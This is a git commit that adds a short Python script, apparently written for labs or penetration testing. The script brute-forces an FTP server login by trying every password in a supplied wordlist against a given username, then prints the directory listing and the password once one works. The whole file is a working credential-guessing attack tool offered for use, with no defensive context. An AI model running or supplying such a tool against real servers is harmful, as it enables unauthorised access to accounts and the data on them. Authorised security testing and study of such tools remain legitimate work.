624ed3454d02551bfeb8cd371a321358b1a2a027
Zakarye R. <168565323+zared1@users.noreply.github.com>
2025-11-13 22:10:10 +0100

    Create FTP-bruteforce.py

---
+++ FTP-bruteforce.py
@@ -0,0 +1,30 @@
+#!/usr/bin/env python3
+
+import sys
+import ftplib
+
+if len(sys.argv) < 3:
+    print("Usage: python3 ftpcracker.py <FTP_server_IP> <username> <passwords-file-location>  \n Example: python3 ftpcracker.py 10.10.11.22 administrator ./passwords.txt \n");
+    sys.exit()
+
+FTP_HOST = sys.argv[1]
+FTP_USER = sys.argv[2]
+
+ftp = ftplib.FTP(FTP_HOST)
+ftp.encoding = "utf-8"
+
+
+
+pwlist = open(sys.argv[3]).read().split("\n")
+for pw in pwlist:
+    try:
+        print("Attempting to login with the password: "+str(pw))
+        ftp.login(FTP_USER,pw)
+    except ftplib.error_perm:
+        continue
+    else:
+        print(ftp.nlst())
+        print("Success: password is " + str(pw))
+        sys.exit()
+
+ftp.close()
